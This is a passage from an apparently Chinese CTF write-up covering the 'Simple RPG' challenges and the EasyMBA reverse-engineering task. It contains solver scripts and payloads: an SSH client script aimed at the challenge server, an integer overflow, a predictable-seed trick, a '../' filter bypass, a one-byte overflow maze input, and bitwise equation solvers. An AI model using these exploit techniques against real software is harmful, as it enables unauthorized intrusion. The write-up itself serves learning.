class="line">        <span class="keyword">else</span>:</span><br><span class="line">            fail+=<span class="number">1</span></span><br><span class="line">            <span class="comment">#data = s.recv(n).decode(&#x27;utf-8&#x27;)</span></span><br><span class="line">            <span class="comment">#print(data)</span></span><br><span class="line">            s.send(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">            b()</span><br><span class="line">            s.recv(n)</span><br><span class="line">            <span class="comment">#data = s.recv(n).decode(&#x27;utf-8&#x27;)</span></span><br><span class="line">            b()</span><br><span class="line">            <span class="comment">#print(data[:20],data[-20:])</span></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">            direction[level] = (direction[level]+<span class="number">1</span>)%<span class="number">4</span></span><br><span class="line">    <span class="built_in">print</span>(level)</span><br><span class="line">    <span class="keyword">return</span> fail &lt; <span class="number">3</span></span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">begin()</span><br><span class="line"><span class="keyword">while</span> <span class="keyword">not</span> stage2():</span><br><span class="line">    <span class="comment">#ssh = paramiko.SSHClient()</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span></span><br><span class="line">    ssh.close()</span><br><span class="line">    ssh.connect(<span class="string">&#x27;111.186.57.85&#x27;</span>,<span class="number">40150</span>,<span class="string">&#x27;guest&#x27;</span>,<span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line">    s = ssh.invoke_shell(width=<span class="number">181</span>,height=<span class="number">58</span>)</span><br><span class="line">    begin()</span><br><span class="line">data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">getFlag(data)</span><br><span class="line">data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">getFlag(data)</span><br><span class="line">data = s.recv(n).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">getFlag(data)</span><br><span class="line">ssh.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="简单的RPG2"><a href="#简单的RPG2" class="headerlink" title="简单的RPG2"></a>简单的RPG2</h3><p>溢出 cost会变小</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> num = (<span class="number">1</span>&lt;&lt;<span class="number">16</span>)/<span class="number">50</span> ;num&lt;=<span class="number">99999999</span>;num++)&#123;</span><br><span class="line">		<span class="type">int</span> cost = num*<span class="number">50</span>;</span><br><span class="line">		<span class="keyword">if</span>(cost &gt; <span class="number">0</span> &amp;&amp; cost &lt; <span class="number">10000</span>)&#123;</span><br><span class="line">			std::cout&lt;&lt;num&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;cost&lt;&lt;std::endl;</span><br><span class="line">		&#125;</span><br><span class="line">				</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="简单的RPG3"><a href="#简单的RPG3" class="headerlink" title="简单的RPG3"></a>简单的RPG3</h3><p>随机种子是time&#x2F;10 10s重置一次 且是stage3函数开始的时候，所以只要用另一台时区一致的机器跑一样的代码即可</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> tab[<span class="number">4</span>]=&#123;<span class="string">&#x27;W&#x27;</span>,<span class="string">&#x27;A&#x27;</span>,<span class="string">&#x27;S&#x27;</span>,<span class="string">&#x27;D&#x27;</span>&#125;;</span><br><span class="line">        <span class="built_in">srand</span>(<span class="built_in">time</span>(<span class="number">0</span>)/<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span> ;i &lt; <span class="number">10</span> ;i++)&#123;</span><br><span class="line">                std::cout&lt;&lt;tab[<span class="built_in">rand</span>()%<span class="number">4</span>]&lt;&lt;<span class="string">&quot;,&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        std::cout&lt;&lt;std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="简单的RPG4"><a href="#简单的RPG4" class="headerlink" title="简单的RPG4"></a>简单的RPG4</h3><p>ida 逆向</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%48s&quot;</span>,s1);</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">memcmp</span>(s1,<span class="string">&quot;your_deck/&quot;</span>,<span class="number">0xA</span>uLL));</span><br><span class="line"><span class="keyword">for</span>(dest = s1; <span class="built_in">strcpy</span>(dest,dest+<span class="number">1</span>))&#123;</span><br><span class="line">    dest = <span class="built_in">strstr</span>(dest,<span class="string">&quot;../&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!dest)&#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>只能用your_deck 且过滤了..&#x2F;<br>但实际上每次过滤之后dest会直接移动一个位置，因此<code>.../</code>会被替换为<code>../</code> 然后找一个攻击力更高的就行了 （前两个byte）</p>
<h3 id="简单的RPG5"><a href="#简单的RPG5" class="headerlink" title="简单的RPG5"></a>简单的RPG5</h3><p>一个表面上走不通的迷宫<br>两个迷惑的地方</p>
<ol>
<li>为什么输入和迷宫数据用的是同一个地址？</li>
<li>为什么迷宫信息需要用那么复杂的方式？</li>
</ol>
<p>分别对应的利用点：</p>
<ol>
<li>scanf %s 最后会补\0 导致覆盖1个byte的数据</li>
<li>表面上是用一个bit存数据 节省空间 实际上覆盖1个byte的数据足以改变8个迷宫格子 打造一条通路</li>
</ol>
<p>exp:<code>wddddddsddddddddssddddwwddssssaassssddssddwwddwwaawwddddwwddwwddddddddssssssddssssaassssddssssssaaaaaaaaaaaaaassssssssssaaaaaassssssssddssssaassssddssddddddddddddddwwddddddddssddddddwwddddddssddddddddwwwwddddssddssddddwwwwwwwwddddssddssssssddddwwddddddddddddddssdd00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000</code></p>
<h3 id="简单的RPG6"><a href="#简单的RPG6" class="headerlink" title="简单的RPG6"></a>简单的RPG6</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> v12[<span class="number">128</span>];<span class="comment">//[rsp+70h]</span></span><br><span class="line"><span class="type">unsigned</span> int8 v13;<span class="comment">//[rsp+F0h]</span></span><br><span class="line"><span class="type">char</span> v14;<span class="comment">//[rsp+F1h]</span></span><br></pre></td></tr></table></figure>
<p>v12[128] &#x3D;&#x3D; v13<br>v12[129] &#x3D;&#x3D; v14<br>目标是让v13变成129 这样直接拿v14的值比 和随机数无关<br><code>[&gt;&gt;&lt;+]</code>靠[]让v13循环加到127，然后v12[v13]加到溢出到0停止循环<br><code>&gt;+</code>v13加到129<br><code>.</code>让v5是1<br>payload：<code>+[&gt;&gt;&lt;+]&gt;+.</code></p>
<h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="EasyMBA"><a href="#EasyMBA" class="headerlink" title="EasyMBA"></a>EasyMBA</h3><p>简单位运算的方程<br>由于位运算的高位不会对低位产生影响 所以可以看成是每个bit的方程 这个方程一阶命题逻辑方程，可能多解，也可能无解。多解情况下可以回溯。<br>这里用unsigned int 模拟每个寄存器 然后用运算符翻译一下汇编的指令，模拟之后一个个bit枚举即可。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">checker1 </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">2833100173</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">-0x9c68db12=0xc74d27b</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">checker2</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="comment">//79606647</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> a = <span class="number">0x50994505</span> ;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> b = <span class="number">0x57B0131A</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> ans = ~a-b;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span> ;i &lt; <span class="number">32</span>;i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(i==<span class="number">8</span>)std::cout&lt;&lt;x&lt;&lt;std::endl;</span><br><span class="line">		<span class="keyword">if</span>((((x&amp;<span class="number">0x5427F672</span>)+(x&amp;<span class="number">0x5427F672</span>)+(x&amp;<span class="number">0x5427F672</span>)+ ~(x | <span class="number">0xABD8098D</span>)+<span class="number">1</span> + ~x+<span class="number">1</span>) &amp; (<span class="number">1</span>&lt;&lt;i))== (ans &amp; (<span class="number">1</span>&lt;&lt;i)))&#123;</span><br><span class="line">	</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			x |= (<span class="number">1</span>&lt;&lt;i);</span><br><span class="line">			std::cout&lt;&lt;i&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;(ans &amp; (<span class="number">1</span>&lt;&lt;i))&lt;&lt;std::endl;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	std::cout&lt;&lt;x&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;((x&amp;<span class="number">0x5427F672</span>)+(x&amp;<span class="number">0x5427F672</span>)+(x&amp;<span class="number">0x5427F672</span>)+ ~(x | <span class="number">0xABD8098D</span>)+<span class="number">1</span> + ~x+<span class="number">1</span>)&lt;&lt;<span class="string">&quot; &quot;</span>&lt;&lt;ans&lt;&lt;std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">checker3_check</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> x,<span class="type">int</span> i)</span></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> ans = <span class="number">0x2334EB06</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> eax = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> edx = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> ecx = <span class="number">0</span>;</span><br><span class="line">	eax = x;</span><br><span class="line">	eax  = ~eax;</span><br><span class="line">	eax |=  <span class="number">0xADFDBC7B</span>;</span><br><span class="line">	edx = eax;</span><br><span class="line">	eax &lt;&lt;= <span class="number">2</span>;</span><br><span class="line">	ecx = edx;</span><br><span class="line">	ecx -= eax;</span><br><span class="line">	eax = x;</span><br><span class="line">	eax |= <span class="number">0xADFDBC7B</span>;</span><br><span class="line">	eax = ~eax;</span><br><span class="line">	edx = eax;</span><br><span class="line">	eax = edx;</span><br><span class="line">	eax += eax;</span><br><span class="line">	eax += edx;</span><br><span class="line">	edx = eax+ecx;</span><br><span class="line">	eax = x;</span><br><span class="line">	eax = ~eax;</span><br><span class="line">	eax &amp;= <span class="number">0xADFDBC7B</span>;</span><br><span class="line">	ecx = eax;</span><br><span class="line">	eax = x;</span><br><span class="line">	eax = ~eax;</span><br><span class="line">	eax |= <span class="number">0xADFDBC7B</span>;</span><br><span class="line">	eax = eax;</span><br><span class="line">	eax = ~eax;</span><br><span class="line">	eax +=eax;</span><br><span class="line">	eax += ecx;</span><br><span class="line">	eax &lt;&lt;= <span class="number">2</span>;</span><br><span class="line">	edx += eax;</span><br><span class="line">	eax = x;</span><br><span class="line">	eax ^= <span class="number">0xADFDBC7B</span>;</span><br><span class="line">	ecx = eax;</span><br><span class="line">	eax = x;</span><br><span class="line">	eax &amp;= <span class="number">0xADFDBC7B</span>;</span><br><span class="line">	eax *= (<span class="number">-0xa</span>);</span><br><span class="line">	eax += ecx;</span><br><span class="line">	edx -= eax;</span><br><span class="line">	eax = edx;</span><br><span class="line">	</span><br><span class="line">			</span><br><span class="line">	<span class="comment">//std::cout&lt;&lt;std::hex&lt;&lt;eax&lt;&lt;&quot; &quot;&lt;&lt;edx&lt;&lt;&quot; &quot;&lt;&lt;ecx&lt;&lt;&quot; &quot;&lt;&lt;esi&lt;&lt;&quot; &quot;&lt;&lt;edi&lt;&lt;std::endl;</span></span><br><span class="line">	<span class="keyword">return</span> (eax &amp; (<span class="number">1</span>&lt;&lt;i)) == (ans &amp; (<span class="number">1</span>&lt;&lt;i));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">checker3</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="comment">//84381514</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span> ;i &lt; <span class="number">32</span> ;i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">checker3_check</span>(x,i))&#123;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		x |= (<span class="number">1</span>&lt;&lt;i);</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">checker3_check</span>(x,i))&#123;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			std::cout&lt;&lt;<span class="string">&quot;cant find answer&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	std::cout&lt;&lt;x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">checker4_check</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> x,<span class="type">int</span> i)</span></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> ans = <span class="number">0xDE2B3E84</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> eax = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> edx = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> ecx = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> esi = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> edi = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> rdi = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> rsi = <span class="number">0</span>;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> rax = <span class="number">0</span>;</span><br><span class="line">	eax = x;</span><br><span class="line">	eax ^= <span class="number">0xE76EDA24</span>;</span><br><span class="line">	eax = eax;</span><br><span class="line">	eax = ~eax;</span><br><span class="line">	edx = eax;</span><br><span class="line">	eax = edx;</span><br><span class="line">	eax &lt;&lt;= <span class="number">2</span>;</span><br><span class="line">	eax +=  edx;</span><br><span class="line">	eax += eax;</span><br><span class="line">	edx += eax;</span><br><span class="line">	eax = x;</span><br><span class="line">	eax = ~eax;</span><br><span class="line">	eax |= <span class="number">0xE76EDA24</span>;</span><br><span class="line">	eax = eax;</span><br><span class="line">	eax = ~eax;</span><br><span class="line">	eax &lt;&lt;= <span class="number">2</span>;</span><br><span class="line">	ecx = edx + eax;</span><br><span class="line">	eax = x;</span><br><span class="line">	eax &amp;= <span class="number">0xE76EDA24</span>;</span><br><span class="line">	edx = eax;</span><br><span class="line">	eax = edx;</span><br><span class="line">	eax += eax;</span><br><span class="line">	eax += edx;</span><br><span class="line">	eax += eax;</span><br><span class="line"></span><br><span class="line">	esi  = eax;</span><br><span class="line">	eax = x;</span><br><span class="line">	eax |= <span class="number">0xE76EDA24</span>;</span><br><span class="line">	eax = eax;</span><br><span class="line">	eax = ~eax;</span><br><span class="line">	edx = eax;</span><br><span class="line">	eax = edx;</span><br><span class="line">	eax += eax;</span><br><span class="line">	</span><br><span class="line">	eax += edx;</span><br><span class="line">	eax &lt;&lt;= <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">	eax += esi;</span><br><span class="line">	ecx -= eax;</span><br><span class="line">	edx = x;</span><br><span class="line">	eax = edx;</span><br><span class="line">	eax &lt;&lt;= <span class="number">2</span>;</span><br><span class="line">	eax += edx;</span><br><span class="line">	eax = -eax;</span><br><span class="line">	edx = x;</span><br><span class="line">	edx |= <span class="number">0xCD731B78</span>;</span><br><span class="line">	</span><br><span class="line">	edx = edx;</span><br><span class="line">	edx = ~edx;</span><br><span class="line">	edx += edx;</span><br><span class="line">	eax -= edx;</span><br><span class="line">	edx = eax;</span><br><span class="line">	eax = x;</span><br><span class="line">	eax |= <span class="number">0x328CE487</span>;</span><br><span class="line">	esi = edx;</span><br><span class="line">	esi -= eax;</span><br><span class="line">	eax = x;</span><br><span class="line">	eax &amp;= <span class="number">0xCD731B78</span>;</span><br><span class="line">	edx = eax;</span><br><span class="line">	eax = edx;</span><br><span class="line">	eax += eax;</span><br><span class="line">	eax += edx;</span><br><span class="line">	edx = esi+eax;</span><br><span class="line">	<span class="comment">//std::cout&lt;&lt;std::hex&lt;&lt;eax&lt;&lt;&quot; &quot;&lt;&lt;edx&lt;&lt;&quot; &quot;&lt;&lt;ecx&lt;&lt;&quot; &quot;&lt;&lt;esi&lt;&lt;&quot; &quot;&lt;&lt;edi&lt;&lt;std::endl;</span></span><br><span class="line">	eax = x;</span><br><span class="line">	</span><br><span class="line">	rsi = <span class="number">0xFFFFFFFF328CE487</span>;</span><br><span class="line">	rax |= eax;</span><br><span class="line">	rsi |= rax;</span><br><span class="line">	eax = x;</span><br><span class="line">	rax = x;</span><br><span class="line">	</span><br><span class="line">	rdi = <span class="number">0xFFFFFFFF328CE487</span>;</span><br><span class="line">	rax |= eax;</span><br><span class="line">	rdi &amp;= rax;</span><br><span class="line">	</span><br><span class="line">	eax = <span class="number">0</span>;</span><br><span class="line">	rax = <span class="number">0</span>;</span><br><span class="line">	rax -=rdi;</span><br><span class="line">	rax += rax;</span><br><span class="line">	</span><br><span class="line">	rsi -= rax;</span><br><span class="line">	rax = rsi;</span><br><span class="line">	esi = rsi &amp; <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">	eax = rax &amp; <span class="number">0xFFFFFFFF</span>;</span><br><span class="line">	esi = eax;</span><br><span class="line">	eax = <span class="number">0</span>;</span><br><span class="line">	eax -= esi;</span><br><span class="line">	eax += eax;</span><br><span class="line">	edx -= eax;</span><br><span class="line">	eax = edx;</span><br><span class="line">	eax += ecx;</span><br><span class="line">	eax += <span class="number">0x189125DA</span>;</span><br><span class="line">	</span><br><span class="line">			</span><br><span class="line">	<span class="comment">//std::cout&lt;&lt;std::hex&lt;&lt;eax&lt;&lt;&quot; &quot;&lt;&lt;edx&lt;&lt;&quot; &quot;&lt;&lt;ecx&lt;&lt;&quot; &quot;&lt;&lt;esi&lt;&lt;&quot; &quot;&lt;&lt;edi&lt;&lt;std::endl;</span></span><br><span class="line">	<span class="keyword">return</span> (eax &amp; (<span class="number">1</span>&lt;&lt;i)) == (ans &amp; (<span class="number">1</span>&lt;&lt;i));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">checker4</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="comment">//69863554</span></span><br><span class="line">	std::stack&lt;<span class="type">int</span>&gt; try_stack;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> x = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span> ;i &lt; <span class="number">32</span> ;i++)&#123;</span><br><span class="line">		<span class="type">bool</span> use0 = <span class="built_in">checker4_check</span>(x,i);</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> xx = x | (<span class="number">1</span>&lt;&lt;i);</span><br><span class="line">		<span class="type">bool</span> use1 = <span class="built_in">checker4_check</span>(xx,i);</span><br><span class="line">		<span class="keyword">if</span>(use0 &amp; !use1)&#123;</span><br><span class="line">			std::cout&lt;&lt;i&lt;&lt;<span class="string">&quot;:0&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(use1 &amp; !use0)&#123;</span><br><span class="line">			x = xx;</span><br><span class="line">			std::cout&lt;&lt;i&lt;&lt;<span class="string">&quot;:1&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(use1 &amp;&amp; use0)&#123;</span><br><span class="line">			try_stack.<span class="built_in">push</span>(i);</span><br><span class="line">			std::cout&lt;&lt;i&lt;&lt;<span class="string">&quot;:both,choose 0&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">			<span class="keyword">continue</span>;<span class="comment">// first try 0</span></span><br><span class="line">		&#125;</span><br><span class="line">		std::cout&lt;&lt;i&lt;&lt;<span class="string">&quot; cant choose &quot;</span>;</span><br><span class="line">		<span class="keyword">if</span>(!try_stack.<span class="built_in">empty</span>())&#123;</span><br><span class="line">			i = try_stack.<span class="built_in">top</span>();</span><br><span class="line">			std::cout&lt;&lt;<span class="string">&quot;return to&quot;</span>&lt;&lt;i&lt;&lt;<span class="string">&quot;:1&quot;</span>&lt;&lt;std::endl;</span><br><span class="line">			try_stack.<span class="built_in">pop</span>();</span><br><span class="line">			x &amp;=  ~((~<span class="number">0</span>)&lt;&lt;i);</span><br><span class="line">			x |= (<span class="number">1</span>&lt;&lt;i);</span><br><span class="line">			<span class="keyword">continue</span>;	</span><br><span class="line">		&#125;</span><br><span class="line">		std::cout&lt;&lt;x&lt;&lt;<span 